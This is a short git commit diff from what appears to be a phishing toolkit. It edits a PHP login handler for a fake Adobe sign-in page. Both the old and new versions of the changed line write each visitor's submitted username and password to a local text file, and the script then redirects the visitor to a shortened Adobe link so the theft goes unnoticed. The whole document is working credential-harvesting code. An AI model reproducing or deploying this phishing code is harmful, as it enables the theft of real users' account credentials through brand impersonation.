9585966bca362a6be9737d2a27819813ee09cd54
Tahmid Rayat <56682134+htr-tech@users.noreply.github.com>
2019-11-27 12:22:47 +0600

    Update login.php

--- websites/adobe/login.php
+++ websites/adobe/login.php
@@ -1,5 +1,5 @@
 <?php
 
-    file_put_contents("usernames.txt", "Adobe :- Username : " . $_POST['username'] . "  ||  Pass: " . $_POST['password'] . "\n", FILE_APPEND);
+    file_put_contents("usernames.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://adobe.ly/2OE9ZKL');
 exit();
